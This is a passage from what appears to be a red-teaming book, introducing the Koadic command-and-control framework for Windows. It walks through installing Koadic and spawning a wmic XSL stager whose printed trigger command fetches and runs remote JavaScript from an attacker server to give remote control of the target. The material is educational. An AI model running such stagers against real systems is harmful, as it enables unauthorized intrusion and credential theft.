- pgno: 35
  md: "Golang, this could be your chance. The framework has just shy of 50 post-exploitation\
    \ modules, from credential harvesters to modules for compiling and executing C#\
    \ in memory.\n\n# Koadic\n\nThe Koadic framework by zerosum0x0 (https://github.com/zerosum0x0/koadic/)\
    \ has gained popularity since its introduction at DEF CON 25. Koadic focuses solely\
    \ on Windows targets, but its main selling point is that it implements all sorts\
    \ of trendy and nifty execution tricks: regsvr32 (a Microsoft utility to register\
    \ DLLs in the Windows Registry so they can be called by other programs; it can\
    \ be used to trick DLLs like srcobj.dll into executing commands), mshta (a Microsoft\
    \ utility that executes HTML Applications, or HTAs), XSL style sheets, you name\
    \ it. Install Koadic with the following:\n\n```\nroot@Lab:~/# git clone https://github.com/zerosum0x0/koadic.git\n\
    root@Lab:~/# pip3 install -r requirements.txt\n```\n\nThen launch it with the\
    \ following (I've also included the start of the help output):\n\n```\nroot@Lab:~/#\
    \ ./koadic\n\n(koadic: sta/js/mshta)$ help\n    COMMAND          DESCRIPTION\n\
    \    --------          -----------\n    cmdshell          command shell to interact\
    \ with a zombie\n    creds             shows collected credentials\n    domain\
    \            shows collected domain information\n--snip--\n```\n\nLet’s experiment\
    \ with a stager—a small piece of code dropped on the target machine to initiate\
    \ a connection back to the server and load additional payloads (usually stored\
    \ in memory). A stager has a small footprint, so should an antimalware tool flag\
    \ our agent, we can easily tweak the agent without rewriting our payloads. One\
    \ of Koadic’s included stagers delivers its payload through an ActiveX object\
    \ embedded in an XML style sheet, also called XSLT (https://www.w3.org/Style/XSL/).\
    \ Its evil formatting XSLT sheet can be fed to the native wmic utility, which\
    \ will promptly execute the embedded JavaScript while rendering the output of\
    \ the os get command. Execute the following in Koadic to spawn the stager trigger:\n\
    \n```\n(koadic: sta/js/mshta)$ use stager/js/wmic\n(koadic: sta/js/wmic)$ run\n\
    \n[+] Spawned a stager at http://192.168.1.25:9996/Ar0x0.xsl\n\n[>] wmic os get\
    \ /FORMAT:\"http://192.168.1.25:9996/Ar0x0.xsl\"\n```"
